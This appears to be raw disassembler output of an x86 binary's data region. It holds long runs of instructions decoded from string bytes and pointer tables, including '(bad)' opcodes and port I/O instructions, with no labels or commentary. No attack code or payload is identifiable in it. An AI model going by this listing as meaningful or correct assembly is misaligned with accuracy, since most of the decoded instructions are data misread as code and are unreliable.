  427ee5:	and    eax,0x4d1dd74d
  427eea:	xlat   BYTE PTR ds:[ebx]
  427eeb:	adc    eax,0x4d71d74d
  427ef0:	xlat   BYTE PTR ds:[ebx]
  427ef1:	and    DWORD PTR [ebp-0x29],ecx
  427ef4:	out    dx,eax
  427ef5:	xchg   cl,bl
  427ef7:	mov    eax,0x77804d4d
  427efc:	out    dx,eax
  427efd:	push   eax
  427efe:	jne    0x427f35
  427f00:	out    dx,al
  427f01:	xor    BYTE PTR [ebp+0x35],0x35
  427f05:	dec    edi
  427f06:	push   0x9
  427f08:	prefetcht0 BYTE PTR [ebp+0x75808d8d]
  427f0f:	xor    eax,0x96a4f45
  427f14:	(bad)  
  427f16:	lea    ecx,[ebp+0x35d54d8d]
  427f1c:	and    eax,0x2535d54d
  427f21:	dec    ebp
  427f22:	aad    0x35
  427f24:	and    eax,0x81357580
  427f29:	dec    ebp
  427f2a:	test   DWORD PTR [eax-0x7f11ca8b],0x80ee3575
  427f34:	jne    0x427f6b
  427f36:	out    dx,al
  427f37:	add    DWORD PTR [edi-0x12],esi
  427f3a:	push   eax
  427f3b:	jne    0x427f72
  427f3d:	out    dx,eax
  427f3e:	xor    BYTE PTR [ebp+0x35],0x3d
  427f42:	in     al,dx
  427f43:	jne    0x427f7a
  427f45:	out    dx,al
  427f46:	push   eax
  427f47:	jne    0x427f7e
  427f49:	out    dx,al
  427f4a:	xor    BYTE PTR [ebp+0x35],0xee
  427f4e:	xor    BYTE PTR [ebp+0x35],0xee
  427f52:	xor    BYTE PTR [ecx],0x35
  427f55:	out    dx,al
  427f56:	adc    BYTE PTR [eax+0x26],0x3a
  427f5a:	lea    ecx,[ebp-0x2a7ff180]
  427f60:	xor    eax,0x2ecd80ef
  427f65:	cmp    cl,BYTE PTR [ebp+0x9195f8d]
  427f6b:	jmp    0x7180:0x8d8d3a16
  427f72:	add    BYTE PTR [ecx+0x165aa80],0x95
  427f79:	sbb    DWORD PTR [edx],ecx
  427f7b:	sub    BYTE PTR [esi-0x80],0x90
  427f7f:	in     al,dx
  427f80:	jle    0x427f02
  427f82:	aad    0x35
  427f84:	out    dx,eax
  427f85:	pop    edi
  427f86:	sbb    DWORD PTR [ecx],ecx
  427f88:	in     eax,dx
  427f89:	fstp   TBYTE PTR [edx]
  427f8b:	lea    ecx,[ebp-0x10ca6a80]
  427f91:	sub    BYTE PTR [esi-0x80],0xa6
  427f95:	or     BYTE PTR [ebp-0x4d13aebd],0x50
  427f9c:	or     al,0xbe
  427f9e:	sar    BYTE PTR [edx],1
  427fa0:	lea    ecx,[ebp+0x45357580]
  427fa6:	dec    edi
  427fa7:	push   0x9
  427fa9:	dec    edi
  427faa:	cdq    
  427fab:	cmp    cl,BYTE PTR [ebp+0x3575808d]
  427fb1:	out    dx,al
  427fb2:	or     ch,0x2e
  427fb5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427fbb:	jne    0x427ff2
  427fbd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427fc3:	int    0x26
  427fc5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427fcb:	jne    0x428002
  427fcd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427fd3:	int    0x10
  427fd5:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427fdb:	lea    edx,[eax+0x75]
  427fde:	xor    eax,0x35758021
  427fe3:	out    dx,al
  427fe4:	or     ch,0x41
  427fe7:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427fed:	lea    edx,[eax+0x75]
  427ff0:	xor    eax,0x35758021
  427ff5:	out    dx,al
  427ff6:	xor    BYTE PTR [ecx],0x35
  427ff9:	out    dx,al
  427ffa:	or     ch,0x82
  427ffd:	cmp    cl,BYTE PTR [ebp-0x7daf7f73]
  428003:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  428009:	xor    dl,bh
  42800b:	and    ah,BYTE PTR [edi+ebp*2]
  42800e:	cmp    BYTE PTR [ebx-0x4],dl
  428011:	in     eax,dx
  428012:	add    eax,0xc86b20d
  428017:	mov    dl,0xba
  428019:	sub    edi,edi
  42801b:	std    
  42801c:	push   eax
  42801d:	xor    DWORD PTR ds:0x35757c21,esi
  428023:	out    dx,eax
  428024:	lea    ecx,[ebp+0x75808d8d]
  42802a:	xor    eax,0xd56a4f35
  42802f:	ret    
  428030:	xor    BYTE PTR [ebp+0x35],0x71
  428034:	in     eax,dx
  428035:	xchg   BYTE PTR [ebp-0x2a82272b],cl
  42803b:	push   ebx
  42803c:	jge    0x4280bb
  42803e:	aad    0x23
  428040:	jge    0x428019
  428042:	fmul   DWORD PTR [ebp-0x2b]
  428045:	xor    eax,0x35d54d2d
  42804a:	sub    eax,0x2d35d54d
  42804f:	dec    ebp
  428050:	aad    0x35
  428052:	sub    eax,0x55357580
  428057:	dec    ebp
  428058:	test   esp,0x35d54d39
  42805e:	and    eax,0x2535d54d
  428063:	dec    ebp
  428064:	aad    0x35
  428066:	and    eax,0x81357580
  42806b:	dec    ebp
  42806c:	test   esp,0x35d54d90
  428072:	adc    eax,0x3d357580
  428077:	dec    ebp
  428078:	test   esp,0x3575806f
  42807e:	xor    eax,0x7550f74d
  428083:	xor    eax,0x357580ef
  428088:	and    DWORD PTR [edi+0x6a],ecx
  42808b:	aad    0xa1
  42808d:	xor    BYTE PTR [ebp+0x35],0xee
  428091:	jl     0x428060
  428093:	test   BYTE PTR [edx],bh
  428095:	lea    ecx,[ebp+0x386f24f5]
  42809b:	xor    BYTE PTR [ebp+0x35],0xef
  42809f:	xor    BYTE PTR [ecx],0x35
  4280a2:	out    dx,al
  4280a3:	adc    BYTE PTR [eax-0x7d],0x3a
  4280a7:	lea    ecx,[ebp+0x757c3a50]
  4280ad:	xor    eax,0x6f24f6ef
  4280b2:	cmp    BYTE PTR [eax-0x7f10ca8b],al
  4280b8:	xor    DWORD PTR ds:0xedfc53ef,esi
  4280be:	add    eax,0x29bab20d
  4280c3:	mov    dl,0x86
  4280c5:	or     al,0xff
  4280c7:	mov    dl,0x80
  4280c9:	xor    DWORD PTR ds:0xd7b26321,esi
  4280cf:	and    eax,DWORD PTR [eax-0x7f11ca8b]
  4280d5:	xor    DWORD PTR ds:0x835080ee,esi
  4280db:	cmp    cl,BYTE PTR [ebp-0x7f91b273]
  4280e1:	int    0x32
  4280e3:	cmp    cl,BYTE PTR [ebp+0x3d0a4d8d]
  4280e9:	les    ebx,FWORD PTR [edi]
  4280eb:	add    DWORD PTR [edi-0x12],esi
  4280ee:	push   eax
  4280ef:	jne    0x428126
  4280f1:	and    DWORD PTR [eax-0x7fdeca8b],eax
  4280f7:	xor    DWORD PTR ds:0xe55080ee,esi
  4280fd:	cmp    cl,BYTE PTR [ebp+0x3a30808d]
  428103:	out    dx,eax
  428104:	xor    BYTE PTR [ebp+0x35],0xee
  428108:	or     ch,0x87
  42810b:	cmp    cl,BYTE PTR [ebp-0x7f10b273]
  428111:	xor    DWORD PTR ds:0x865080ee,esi
  428117:	cmp    cl,BYTE PTR [ebp+0x18d808d]
  42811d:	out    dx,al
  42811e:	mov    ds:0xee353180,al
  428123:	adc    BYTE PTR [eax-0x1b],0x3a
  428127:	lea    ecx,[ebp+0x30808d80]
  42812d:	cmp    ch,bh
  42812f:	test   eax,0xfba7b880
  428134:	sub    eax,0x614c748d
  428139:	imul   edi,DWORD PTR [ecx+0x62],0x69
  42813d:	popa   
  42813e:	push   0x6c656548
  428143:	ins    BYTE PTR es:[edi],dx
  428144:	outs   dx,DWORD PTR ds:[esi]
  428145:	ja     0x428147
  428147:	popa   
  428148:	ins    DWORD PTR es:[edi],dx
  428149:	imul   edi,DWORD PTR [edx+0x65],0x676f6e70
  428150:	push   ebp
  428151:	outs   dx,BYTE PTR ds:[esi]
  428152:	bound  esp,QWORD PTR [ebp+0x0]
  428155:	push   0x6572576d
  42815a:	outs   dx,BYTE PTR ds:[esi]
  42815b:	jne    0x4281c1
  42815d:	outs   dx,DWORD PTR ds:[esi]
  42815e:	popa   
  42815f:	push   0x6b637573
  428164:	add    BYTE PTR [ebp+0x6f],cl
  428167:	ins    DWORD PTR es:[edi],dx
  428168:	imul   ecx,DWORD PTR [ebp+0x75],0x6c617367
  42816f:	jo     0x4281d6
  428171:	je     0x428173
  428173:	dec    edx
  428174:	gs jae 0x4281ea
  428177:	ins    BYTE PTR es:[edi],dx
  428178:	outs   dx,DWORD PTR ds:[esi]
  428179:	dec    edi
  42817a:	js     0x4281e1
  42817c:	outs   dx,BYTE PTR ds:[esi]
  42817d:	outs   dx,DWORD PTR ds:[esi]
  42817e:	jb     0x4281e1
  428180:	add    BYTE PTR [edi+0x6f],al
  428183:	ja     0x4281e9
  428185:	dec    ebp
  428186:	imul   esi,DWORD PTR [ebx+0x6f],0x706179
  42818d:	imul   esi,DWORD PTR fs:[eax+0x6f],0x6d6f6d72
  428195:	imul   esp,DWORD PTR [ebx+0x6b],0x6c6c4900
  42819c:	jae    0x42820b
  42819e:	popa   
  42819f:	fs jns 0x428211
  4281a2:	imul   ebp,DWORD PTR [ecx+0x0],0x6b
  4281a6:	imul   esi,DWORD PTR [edx+0x7a],0x64756261
  4281ad:	bound  esi,QWORD PTR [ebp+0x6d]
  4281b0:	add    BYTE PTR [ebp+0x72],al
  4281b3:	outs   dx,DWORD PTR ds:[si]
  4281b5:	jo     0x428218
  4281b7:	jns    0x42821f
  4281b9:	imul   edi,DWORD PTR [eax+0x0],0x6d736e6f
  4281c0:	jne    0x42822f
  4281c2:	popa   
  4281c3:	gs fs jo 0x42822c
  4281c7:	imul   esi,DWORD PTR [esi+0x79],0x67756800
  4281ce:	dec    esp
  4281cf:	outs   dx,DWORD PTR ds:[esi]
  4281d0:	jne    0x428236
  4281d2:	push   0x6d6d7069
  4281d7:	add    BYTE PTR [edi+0x6c],al
  4281da:	outs   dx,DWORD PTR ds:[esi]
  4281db:	jo     0x428230
  4281dd:	ja     0x42824e
  4281df:	bound  eax,QWORD PTR [eax]
  4281e1:	jns    0x428252
  4281e3:	pop    ecx
  4281e4:	gs ins BYTE PTR es:[edi],dx
  4281e6:	jo     0x428241
  4281e8:	jne    0x428256
  4281ea:	gs gs jae 0x42824f
  4281ee:	popa   
  4281ef:	add    BYTE PTR [ecx+0x77],ah
  4281f2:	popa   
  4281f3:	inc    esi
  4281f4:	imul   ebp,DWORD PTR [esi+0x65],0x4f706173
  4281fb:	outs   dx,BYTE PTR ds:[esi]
  4281fc:	je     0x42826d
  4281fe:	add    BYTE PTR [ebp+0x73],ah
  428201:	dec    esp
  428202:	imul   ebp,DWORD PTR [esi+0x67],0x68737574
  428209:	ins    BYTE PTR es:[edi],dx
  42820a:	outs   dx,DWORD PTR ds:[esi]
  42820b:	bound  esp,QWORD PTR [ebp+0x0]
  42820e:	push   0x617a6761
  428213:	bound  ebp,QWORD PTR [edi+0x75]
  428216:	jo     0x428218
  428218:	inc    edx
  428219:	outs   dx,DWORD PTR ds:[esi]
  42821a:	jb     0x428290
  42821c:	popa   
  42821d:	js     0x42828e
  42821f:	data16 jo 0x428287
  428222:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x776f0077
  42822a:	fs gs popa 
  42822d:	outs   dx,DWORD PTR fs:[esi]
  42822f:	jae    0x4282a9
  428231:	jne    0x428233
  428233:	inc    edi
  428234:	add    BYTE PTR [edi+0x0],ch
  428237:	add    BYTE PTR gs:[ebx+0x0],dh
  42823b:	dec    edx
  42823c:	add    BYTE PTR [ecx+0x0],ah
  42823f:	jbe    0x428241
  428241:	popa   
  428242:	add    BYTE PTR [eax],al
  428244:	add    BYTE PTR [edx+0x0],al
  428247:	popa   
  428248:	add    BYTE PTR [edx+0x0],ah
  42824b:	jne    0x42824d
  42824d:	outs   dx,DWORD PTR ds:[esi]
  42824e:	add    BYTE PTR [ebp+0x0],ch
  428251:	push   0x6d00
  428256:	add    BYTE PTR [edx+0x0],dh
  428259:	popa   
  42825a:	add    BYTE PTR [eax+eax*1+0x74],dh
  42825e:	add    BYTE PTR [ecx+0x0],ah
  428261:	ins    DWORD PTR es:[edi],dx
  428262:	add    BYTE PTR [edi+0x0],ah
  428265:	popa   
  428266:	add    BYTE PTR [ecx+0x0],bh
  428269:	js     0x42826b
  42826b:	imul   eax,DWORD PTR [eax],0x610000
  428271:	ins    DWORD PTR es:[edi],dx
  428272:	add    BYTE PTR [ecx+0x0],ah
  428275:	ins    BYTE PTR es:[edi],dx
  428276:	add    BYTE PTR [edx+0x0],ah
  428279:	outs   dx,DWORD PTR ds:[esi]
  42827a:	add    BYTE PTR [edi+0x0],ch
  42827d:	popa   
  42827e:	add    BYTE PTR [eax+0x0],dh
  428281:	jo     0x428283
  428283:	add    BYTE PTR [eax],al
  428285:	popa   
  428286:	add    BYTE PTR [esi+0x0],dh
  428289:	popa   
  42828a:	add    BYTE PTR [edi+0x0],ah
  42828d:	outs   dx,DWORD PTR ds:[esi]
  42828e:	add    BYTE PTR [ebx+0x0],dh
  428291:	push   0x77006f00
  428296:	add    BYTE PTR [eax+eax*1+0x65],ch
  42829a:	add    BYTE PTR [ebp+0x0],dh
  42829d:	add    BYTE PTR fs:[ebp+0x0],ah
  4282a1:	add    BYTE PTR fs:[eax],al
  4282a4:	add    BYTE PTR [eax+0x0],cl
  4282a7:	popa   
  4282a8:	add    BYTE PTR [edx+0x0],dh
  4282ab:	add    BYTE PTR gs:[edx+0x0],al
  4282af:	imul   eax,DWORD PTR [eax],0x6b0072
  4282b5:	arpl   WORD PTR [eax],ax
  4282b7:	popa   
  4282b8:	add    BYTE PTR [ebp+0x0],ch
  4282bb:	add    BYTE PTR [eax],al
  4282bd:	imul   eax,DWORD PTR [eax],0x61
  4282c0:	add    BYTE PTR [edi+0x0],dh
  4282c3:	popa   
  4282c4:	add    BYTE PTR [eax+0x0],bh
  4282c7:	outs   dx,DWORD PTR ds:[esi]
  4282c8:	add    BYTE PTR [edi+0x0],ch
  4282cb:	je     0x4282cd
  4282cd:	add    BYTE PTR [eax],al
  4282cf:	jb     0x4282d1
  4282d1:	jne    0x4282d3
  4282d3:	add    BYTE PTR gs:[ecx+0x0],ah
  4282d7:	ins    BYTE PTR es:[edi],dx
  4282d8:	add    BYTE PTR [eax+eax*1+0x68],ch
  4282dc:	add    BYTE PTR [ebp+0x0],ch
  4282df:	ins    DWORD PTR es:[edi],dx
  4282e0:	add    BYTE PTR [eax],al
  4282e2:	add    BYTE PTR [edi+0x0],ch
  4282e5:	add    BYTE PTR gs:[eax+0x0],bh
  4282e9:	imul   eax,DWORD PTR [eax],0x650072
  4282ef:	ja     0x4282f1
  4282f1:	outs   dx,DWORD PTR ds:[esi]
  4282f2:	add    BYTE PTR [ebp+0x0],ah
  4282f5:	popa   
  4282f6:	add    BYTE PTR [edx+0x0],ah
  4282f9:	ins    BYTE PTR es:[edi],dx
  4282fa:	add    BYTE PTR [ecx+0x0],ch
  4282fd:	add    BYTE PTR [eax],al
  4282ff:	jne    0x428301
  428301:	ins    DWORD PTR es:[edi],dx
  428302:	add    BYTE PTR [esi+0x0],ch
  428305:	outs   dx,DWORD PTR ds:[esi]
  428306:	add    BYTE PTR [edi+0x0],ah
  428309:	bound  eax,QWORD PTR [eax]
  42830b:	popa   
  42830c:	add    BYTE PTR [esi+0x0],dh
  42830f:	outs   dx,DWORD PTR ds:[esi]
  428310:	add    BYTE PTR [edi+0x0],dh
  428313:	bound  eax,QWORD PTR [eax]
  428315:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  42831a:	add    BYTE PTR [eax],al
  42831c:	add    bh,dh
  42831e:	sub    al,0x10
  428320:	add    BYTE PTR [esi],bl
  428322:	aaa    
  428323:	adc    BYTE PTR [eax],al
  428325:	and    al,0x42
  428327:	adc    BYTE PTR [eax],al
  428329:	rol    BYTE PTR [eax+edx*1],cl
  42832c:	add    ch,dh
  42832e:	xor    BYTE PTR [eax],dl
  428330:	add    BYTE PTR [esi-0x1affefcf],dh
  428336:	cmp    dl,BYTE PTR [eax]
  428338:	add    BYTE PTR [ebx],dh
  42833a:	ins    BYTE PTR es:[edi],dx
  42833b:	adc    BYTE PTR [eax],al
  42833d:	sub    DWORD PTR [eax+edx*1+0x0],esp
  428341:	push   ecx
  428342:	inc    ecx
  428343:	adc    BYTE PTR [eax],al
  428345:	mov    cl,0x60
  428347:	adc    BYTE PTR [eax],al
  428349:	aas    
  42834a:	or     al,0x10
  42834c:	add    al,bh
  42834e:	and    DWORD PTR [eax],edx
  428350:	add    BYTE PTR [edx+0x37],dl
  428353:	adc    BYTE PTR [eax],al
  428355:	test   eax,0xa3001054
  42835a:	add    DWORD PTR [eax],edx
  42835c:	add    BYTE PTR [edi],ah
  42835e:	push   esp
  42835f:	adc    BYTE PTR [eax],al
  428361:	cmc    
  428362:	push   esi
  428363:	adc    BYTE PTR [eax],al
  428365:	imul   ecx,DWORD PTR [ebx],0x10
  428368:	add    BYTE PTR ds:0x21004283,bl
  42836e:	add    DWORD PTR [edx+0x0],0x25
  428372:	add    DWORD PTR [edx+0x0],0x29
  428376:	add    DWORD PTR [edx+0x0],0x2d
  42837a:	add    DWORD PTR [edx+0x0],0x31
  42837e:	add    DWORD PTR [edx+0x0],0x35
  428382:	add    DWORD PTR [edx+0x0],0x39
  428386:	add    DWORD PTR [edx+0x0],0x3d
  42838a:	add    DWORD PTR [edx+0x0],0x41
  42838e:	add    DWORD PTR [edx+0x0],0x45
  428392:	add    DWORD PTR [edx+0x0],0x49
  428396:	add    DWORD PTR [edx+0x0],0x4d
  42839a:	add    DWORD PTR [edx+0x0],0x51
  42839e:	add    DWORD PTR [edx+0x0],0x55
  4283a2:	add    DWORD PTR [edx+0x0],0x59
  4283a6:	add    DWORD PTR [edx+0x0],0x5d
  4283aa:	add    DWORD PTR [edx+0x0],0x61
  4283ae:	add    DWORD PTR [edx+0x0],0x65
  4283b2:	add    DWORD PTR [edx+0x0],0xfffffff5
  4283b6:	add    DWORD PTR [edx+0x0],0xfffffff9
  4283ba:	add    DWORD PTR [edx+0x0],0xfffffffd
  4283be:	add    DWORD PTR [edx+0x0],0x1
  4283c2:	test   BYTE PTR [edx+0x0],al
  4283c5:	add    eax,0x9004284
  4283ca:	test   BYTE PTR [edx+0x0],al
  4283cd:	or     eax,0x11004284
  4283d2:	test   BYTE PTR [edx+0x0],al
  4283d5:	adc    eax,0x19004284
  4283da:	test   BYTE PTR [edx+0x0],al
  4283dd:	sbb    eax,0x21004284
  4283e2:	test   BYTE PTR [edx+0x0],al
  4283e5:	and    eax,0x29004284
  4283ea:	test   BYTE PTR [edx+0x0],al
  4283ed:	sub    eax,0x31004284
  4283f2:	test   BYTE PTR [edx+0x0],al
  4283f5:	arpl   WORD PTR [eax],si
  4283f7:	adc    BYTE PTR [eax],al
  4283f9:	push   ecx
  4283fa:	xor    DWORD PTR [eax],edx
  4283fc:	add    BYTE PTR [edi+ebx*2+0x10],ch
  428400:	add    BYTE PTR [ebx-0x5ffefc3],bl
  428406:	aaa    
  428407:	adc    BYTE PTR [eax],al
  428409:	(bad)  
  42840a:	pop    esi
  42840b:	adc    BYTE PTR [eax],al
  42840d:	call   0x1040:0xa400106a
  428414:	add    BYTE PTR [esi+0x23],ah
  428417:	adc    BYTE PTR [eax],al
  428419:	xor    DWORD PTR [eax],ebx
  42841b:	adc    BYTE PTR [eax],al
  42841d:	mov    edi,DWORD PTR [edi]
  42841f:	adc    BYTE PTR [eax],al
  428421:	and    BYTE PTR [ecx+0x10],0x0
  428425:	clc    
  428426:	ja     0x428438
  428428:	add    BYTE PTR [eax],dh
  42842a:	xor    dl,BYTE PTR [eax]
  42842c:	add    BYTE PTR [edx+esi*2+0x6bfb0010],ch
  428433:	adc    BYTE PTR [eax],al
  428435:	mov    fs,WORD PTR [ebx+0x10]
  428438:	add    BYTE PTR [ecx+0x6200107e],bl
  42843e:	daa    
  42843f:	adc    BYTE PTR [eax],al
  428441:	mov    edi,0x2e001069
  428446:	sub    eax,0x413c0010
  42844b:	adc    BYTE PTR [eax],al
  42844d:	xor    BYTE PTR [eax],dh
  42844f:	adc    BYTE PTR [eax],al
  428451:	outs   dx,BYTE PTR ds:[esi]
  428452:	dec    edi
  428453:	adc    BYTE PTR [eax],al
  428455:	adc    eax,0xeb001025
  42845a:	bound  edx,QWORD PTR [eax]
  42845c:	add    BYTE PTR [edi],dh
  42845e:	and    dl,BYTE PTR [eax]
  428460:	add    BYTE PTR [ebx+0x1a],bl
  428463:	adc    BYTE PTR [eax],al
  428465:	mov    BYTE PTR [esi+0x10],ch
  428468:	add    BYTE PTR [esi],ah
  42846a:	pusha  
  42846b:	adc    BYTE PTR [eax],al
  42846d:	pop    es
  42846e:	adc    eax,0x1ca50010
  428473:	adc    BYTE PTR [eax],al
  428475:	xor    eax,0x39004284
  42847a:	test   BYTE PTR [edx+0x0],al
  42847d:	cmp    eax,0x41004284
  428482:	test   BYTE PTR [edx+0x0],al
  428485:	inc    ebp
  428486:	test   BYTE PTR [edx+0x0],al
  428489:	dec    ecx
  42848a:	test   BYTE PTR [edx+0x0],al
  42848d:	dec    ebp
  42848e:	test   BYTE PTR [edx+0x0],al
  428491:	push   ecx
  428492:	test   BYTE PTR [edx+0x0],al
  428495:	push   ebp
  428496:	test   BYTE PTR [edx+0x0],al
  428499:	pop    ecx
  42849a:	test   BYTE PTR [edx+0x0],al
  42849d:	pop    ebp
  42849e:	test   BYTE PTR [edx+0x0],al
  4284a1:	popa   
  4284a2:	test   BYTE PTR [edx+0x0],al
  4284a5:	test   BYTE PTR gs:[edx+0x0],al
  4284a9:	imul   eax,DWORD PTR [edx+eax*2+0x42846d00],0x42847100
  4284b4:	add    BYTE PTR [ebp+0x200102f],ah
  4284ba:	jle    0x4284cc
  4284bc:	add    BYTE PTR [ebx],ch
  4284be:	adc    al,0x10
  4284c0:	add    BYTE PTR ds:0x4b001060,ah
  4284c6:	pop    edx
  4284c7:	adc    BYTE PTR [eax],al
  4284c9:	dec    ecx
  4284ca:	jne    0x4284dc
  4284cc:	add    dh,ch
  4284ce:	pop    esp
  4284cf:	adc    BYTE PTR [eax],al
  4284d1:	push   edx
  4284d2:	cmp    eax,0x529b0010
  4284d7:	adc    BYTE PTR [eax],al
  4284d9:	pop    ss
  4284da:	cmp    dl,BYTE PTR [eax]
  4284dc:	add    BYTE PTR [ebp-0x64ffef93],cl
  4284e2:	xor    eax,0x158d0010
  4284e7:	adc    BYTE PTR [eax],al
  4284e9:	adc    DWORD PTR [edi+0x10],ebp
  4284ec:	add    BYTE PTR [ecx+0x51],ch
  4284ef:	adc    BYTE PTR [eax],al
  4284f1:	jmp    0x4284ff
  4284f3:	adc    BYTE PTR [eax],al
  4284f5:	mov    ch,0x84
  4284f7:	inc    edx
  4284f8:	add    BYTE PTR [ecx-0x42ffbd7c],bh
  4284fe:	test   BYTE PTR [edx+0x0],al
  428501:	rol    DWORD PTR [edx+eax*2+0x4284c500],0x0
  428509:	leave  
  42850a:	test   BYTE PTR [edx+0x0],al
  42850d:	int    0x84
  42850f:	inc    edx
  428510:	add    cl,dl
  428512:	test   BYTE PTR [edx+0x0],al
  428515:	aad    0x84
  428517:	inc    edx
  428518:	add    cl,bl
  42851a:	test   BYTE PTR [edx+0x0],al
  42851d:	fld    QWORD PTR [edx+eax*2+0x4284e100]
  428524:	add    ch,ah
  428526:	test   BYTE PTR [edx+0x0],al
  428529:	jmp    0xed42c7b2
  42852e:	test   BYTE PTR [edx+0x0],al
  428531:	icebp  
  428532:	test   BYTE PTR [edx+0x0],al
  428535:	xlat   BYTE PTR ds:[ebx]
  428536:	inc    ebp
  428537:	adc    BYTE PTR [eax],al
  428539:	xlat   BYTE PTR ds:[ebx]
  42853a:	pusha  
  42853b:	adc    BYTE PTR [eax],al
  42853d:	lea    ebp,[eax+edx*1+0x0]
  428541:	hlt    
  428542:	add    BYTE PTR [eax],dl
  428544:	add    BYTE PTR [esp+esi*2],dl
  428547:	adc    BYTE PTR [eax],al
  428549:	out    0x44,al
  42854b:	adc    BYTE PTR [eax],al
  42854d:	dec    esi
  42854e:	bound  edx,QWORD PTR [eax]
  428550:	add    BYTE PTR [edi+ebp*2],ch
  428553:	adc    BYTE PTR [eax],al
  428555:	cmp    ebx,DWORD PTR [ebx]
  428557:	adc    BYTE PTR [eax],al
  428559:	inc    ebp
  42855a:	pop    ecx
  42855b:	adc    BYTE PTR [eax],al
  42855d:	imul   BYTE PTR [ecx+0x10]
  428560:	add    BYTE PTR [esi],ah
  428562:	arpl   WORD PTR [eax],dx
  428564:	add    BYTE PTR [ebp-0x4fffefee],bh
  42856a:	sbb    edx,DWORD PTR [eax]
  42856c:	add    BYTE PTR [ebx],ah
  42856e:	adc    BYTE PTR ds:[eax],al
  428571:	xchg   ebx,eax
  428572:	push   ecx
  428573:	adc    BYTE PTR [eax],al
  428575:	xor    eax,0x39004285
  42857a:	test   DWORD PTR [edx+0x0],eax
  42857d:	cmp    eax,0x41004285
  428582:	test   DWORD PTR [edx+0x0],eax
  428585:	inc    ebp
  428586:	test   DWORD PTR [edx+0x0],eax
  428589:	dec    ecx
  42858a:	test   DWORD PTR [edx+0x0],eax
  42858d:	dec    ebp
  42858e:	test   DWORD PTR [edx+0x0],eax
  428591:	push   ecx
  428592:	test   DWORD PTR [edx+0x0],eax
  428595:	push   ebp
  428596:	test   DWORD PTR [edx+0x0],eax
  428599:	pop    ecx
  42859a:	test   DWORD PTR [edx+0x0],eax
  42859d:	pop    ebp
  42859e:	test   DWORD PTR [edx+0x0],eax
  4285a1:	popa   
  4285a2:	test   DWORD PTR [edx+0x0],eax
  4285a5:	test   DWORD PTR gs:[edx+0x0],eax
  4285a9:	imul   eax,DWORD PTR [ebp-0x7a92ffbe],0x85710042
  4285b3:	inc    edx
	...
  4285c4:	sub    ch,dl
  4285c6:	mov    dh,0x4f
  4285c8:	add    BYTE PTR [eax],al
  4285ca:	add    BYTE PTR [eax],al
  4285cc:	xor    BYTE PTR [esi+0x10002],dl
  4285d2:	add    BYTE PTR [eax],al
  4285d4:	add    DWORD PTR [eax],eax
  4285d6:	add    BYTE PTR [eax],al
  4285d8:	add    DWORD PTR [eax],eax
  4285da:	add    BYTE PTR [eax],al
  4285dc:	add    BYTE PTR [esi-0x69dffffe],dl
  4285e2:	add    al,BYTE PTR [eax]
  4285e4:	adc    BYTE PTR [esi+0x2],dl
  4285ea:	add    BYTE PTR [eax],al
  4285ec:	add    BYTE PTR [eax],al
  4285ee:	add    BYTE PTR [eax],al
  4285f0:	add    BYTE PTR [ecx+0x2],cl
  4285f6:	add    BYTE PTR [eax],al
  4285f8:	push   ds
  4285f9:	mov    DWORD PTR [edx],eax
  4285fb:	add    BYTE PTR [edx],dh
  4285fd:	mov    DWORD PTR [edx],eax
  4285ff:	add    BYTE PTR [eax-0x77],cl
  428602:	add    al,BYTE PTR [eax]
  428604:	pop    eax
  428605:	mov    DWORD PTR [edx],eax
  428607:	add    BYTE PTR [esi-0x77],ah
  42860a:	add    al,BYTE PTR [eax]
  42860c:	jle    0x428597
  42860e:	add    al,BYTE PTR [eax]
  428610:	mov    cl,BYTE PTR [ecx-0x765ffffe]
  428616:	add    al,BYTE PTR [eax]
  428618:	lods   al,BYTE PTR ds:[esi]
  428619:	mov    DWORD PTR [edx],eax
  42861b:	add    BYTE PTR [esi-0x35fffd77],bh
  428621:	mov    DWORD PTR [edx],eax
  428623:	add    dl,bl
  428625:	mov    DWORD PTR [edx],eax
  428627:	add    dl,ch
  428629:	mov    DWORD PTR [edx],eax
  42862b:	add    dh,dh
  42862d:	mov    DWORD PTR [edx],eax
  42862f:	add    BYTE PTR [edx+ecx*4],al
  428632:	add    al,BYTE PTR [eax]
  428634:	adc    BYTE PTR [edx-0x75e3fffe],cl
  42863a:	add    al,BYTE PTR [eax]
  42863c:	mov    al,BYTE PTR es:[edx]
  42863f:	add    BYTE PTR [edx],bh
  428641:	mov    al,BYTE PTR [edx]
  428643:	add    BYTE PTR [edx+ecx*4+0x2],cl
  428647:	add    BYTE PTR [esi-0x76],dl
  42864a:	add    al,BYTE PTR [eax]
  42864c:	pusha  
  42864d:	mov    al,BYTE PTR [edx]
  42864f:	add    BYTE PTR [eax-0x76],dh
  428652:	add    al,BYTE PTR [eax]
  428654:	or     BYTE PTR [edx-0x756dfffe],0x2
  42865b:	add    BYTE PTR [edx-0x4ffffd76],ah
  428661:	mov    al,BYTE PTR [edx]
  428663:	add    BYTE PTR [edx+ecx*4-0x7535fffe],bh
  42866a:	add    al,BYTE PTR [eax]
  42866c:	fimul  DWORD PTR [edx-0x7515fffe]
  428672:	add    al,BYTE PTR [eax]
  428674:	clc    
  428675:	mov    al,BYTE PTR [edx]
  428677:	add    BYTE PTR [eax],dl
  428679:	mov    eax,DWORD PTR [edx]
  42867b:	add    BYTE PTR [edx],bl
  42867d:	mov    eax,DWORD PTR [edx]
  42867f:	add    BYTE PTR [edx],ch
  428681:	mov    eax,DWORD PTR [edx]
  428683:	add    BYTE PTR [edx-0x75],al
  428686:	add    al,BYTE PTR [eax]
  428688:	push   esp
  428689:	mov    eax,DWORD PTR [edx]
  42868b:	add    BYTE PTR [ebx+ecx*4+0x2],ah
  42868f:	add    BYTE PTR [ebx+ecx*4+0x2],dh
  428693:	add    BYTE PTR [esi-0x75],bh
  428696:	add    al,BYTE PTR [eax]
  428698:	mov    WORD PTR [ebx-0x7463fffe],cs
  42869e:	add    al,BYTE PTR [eax]
  4286a0:	test   al,0x8b
  4286a2:	add    al,BYTE PTR [eax]
	...
  4286ac:	ror    BYTE PTR [ebx-0x741ffffe],cl
  4286b2:	add    al,BYTE PTR [eax]
  4286b4:	hlt    
  4286b5:	mov    eax,DWORD PTR [edx]
  4286b7:	add    BYTE PTR [edx],al
